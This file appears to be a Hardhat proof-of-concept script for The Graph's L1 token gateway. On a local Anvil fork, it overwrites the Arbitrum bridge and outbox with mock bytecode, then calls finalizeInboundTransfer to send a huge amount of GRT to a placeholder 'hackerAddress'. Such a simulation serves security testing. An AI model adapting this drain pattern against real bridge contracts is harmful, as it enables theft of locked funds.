import hre from 'hardhat'
import '@nomiclabs/hardhat-ethers'
import { BigNumber, providers } from 'ethers'
import PQueue from 'p-queue'
import { getActiveAllocations, getSignaledSubgraphs } from './queries'
import { deployContract, waitTransaction, toBN, toGRT } from '../../cli/network'
import { aggregate } from '../../cli/multicall'
import { chunkify } from '../../cli/helpers'
import { RewardsManager } from '../../build/types/RewardsManager'
import { deriveChannelKey } from '../../test/lib/testHelpers'

const { ethers } = hre

const L1_BRIDGE_ADDRESS = '0xaf4159A80B6Cc41ED517DB1c453d1Ef5C2e4dB72'
const L1_OUTBOX_ADDRESS = '0x45Af9Ed1D03703e480CE7d328fB684bb67DA5049'
// Mock outbox that returns the L2GraphTokenGateway address in l2ToL1Sender()
const OUTBOX_BYTECODE =
  '0x6080604052348015600f57600080fd5b506004361060285760003560e01c806380648b0214602d575b600080fd5b60336047565b604051603e919060a0565b60405180910390f35b600073ef2757855d2802ba53733901f90c91645973f743905090565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000608c826063565b9050919050565b609a816083565b82525050565b600060208201905060b360008301846093565b9291505056fea2646970667358221220b9864f80758fd3804691a2c18de469ed91a0aa7a07d8677145b484e97af6770564736f6c63430008120033'
// Mock bridge that returns the outbox address in activeOutbox(), and forwards calls to L1GraphTokenGateway in the fallback
const BRIDGE_BYTECODE =
  '0x6080604052600436106100225760003560e01c8063ab5d8943146100e15761007c565b3661007c5761007a73c82ff7b51c3e593d709ba3de1b3a0d233d1deca16040518060400160405280600281526020017f307800000000000000000000000000000000000000000000000000000000000081525061010c565b005b6100df73c82ff7b51c3e593d709ba3de1b3a0d233d1deca16000368080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505061010c565b005b3480156100ed57600080fd5b506100f6610209565b6040516101039190610266565b60405180910390f35b6000808373ffffffffffffffffffffffffffffffffffffffff16348460405161013591906102f2565b60006040518083038185875af1925050503d8060008114610172576040519150601f19603f3d011682016040523d82523d6000602084013e610177565b606091505b509150915081610203576000815111156101c857806040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101bf919061036f565b60405180910390fd5b6040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fa906103dd565b60405180910390fd5b50505050565b60007345af9ed1d03703e480ce7d328fb684bb67da5049905090565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061025082610225565b9050919050565b61026081610245565b82525050565b600060208201905061027b6000830184610257565b92915050565b600081519050919050565b600081905092915050565b60005b838110156102b557808201518184015260208101905061029a565b60008484015250505050565b60006102cc82610281565b6102d6818561028c565b93506102e6818560208601610297565b80840191505092915050565b60006102fe82846102c1565b915081905092915050565b600081519050919050565b600082825260208201905092915050565b6000601f19601f8301169050919050565b600061034182610309565b61034b8185610314565b935061035b818560208601610297565b61036481610325565b840191505092915050565b600060208201905081810360008301526103898184610336565b905092915050565b7f43616c6c20746f2074617267657420636f6e7472616374206661696c65640000600082015250565b60006103c7601e83610314565b91506103d282610391565b602082019050919050565b600060208201905081810360008301526103f6816103ba565b905091905056fea26469706673582212205da5e07e4e2702ee87da2b600fb16129a857b408e12a4a33bc70056d401d50ea64736f6c63430008120033'

async function main() {
  // TODO: make read address.json with override chain id
  const { contracts, provider, getDeployer } = hre.graph({
    addressBook: 'addresses.json',
    // graphConfig: 'config/graph.mainnet.yml',
    graphConfig: 'config/graph.goerli.yml',
  })

  console.log('>>>>>>>>>>>>>>', contracts.L1GraphTokenGateway.address)

  // setup roles
  //   const l1Bridge = await ethers.getImpersonatedSigner(L1_BRIDGE_ADDRESS)
  //   const l1Bridge = ethers.getSigner(L1_BRIDGE_ADDRESS)
  //await provider.send('anvil_impersonateAccount', [L1_BRIDGE_ADDRESS])
  const caller = provider.getSigner(0)

  //
  await provider.send('anvil_setCode', [L1_OUTBOX_ADDRESS, OUTBOX_BYTECODE])
  await provider.send('anvil_setCode', [L1_BRIDGE_ADDRESS, BRIDGE_BYTECODE])

  const hackerAddress = '0x8a0e5c8f2c9b1b9b2b0b0b0b0b0b0b0b0b0b0b0b'

  //   const data = await contracts.L1GraphTokenGateway.connect(
  //     l1Bridge,
  //   ).populateTransaction.finalizeInboundTransfer(
  //     contracts.GraphToken.address,
  //     hackerAddress,
  //     hackerAddress,
  //     toGRT('1'),
  //     '0x',
  //   )
  //   console.log(data)

  //const deployer = await getDeployer()
  // await contracts.GraphToken.connect(l1Bridge).transfer(
  //   contracts.L1GraphTokenGateway.address,
  //   toGRT('1'),
  // )

  const txData = await contracts.L1GraphTokenGateway.populateTransaction.finalizeInboundTransfer(
    contracts.GraphToken.address,
    hackerAddress,
    hackerAddress,
    toGRT('1000000000000000'),
    '0x',
  )

  console.log('txdata: ', txData.data)

  const tx = await caller.sendTransaction({
    to: L1_BRIDGE_ADDRESS,
    data: txData.data,
  })
  console.log(tx)
  console.log(await tx.wait())

  console.log(await contracts.GraphToken.balanceOf(hackerAddress))
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})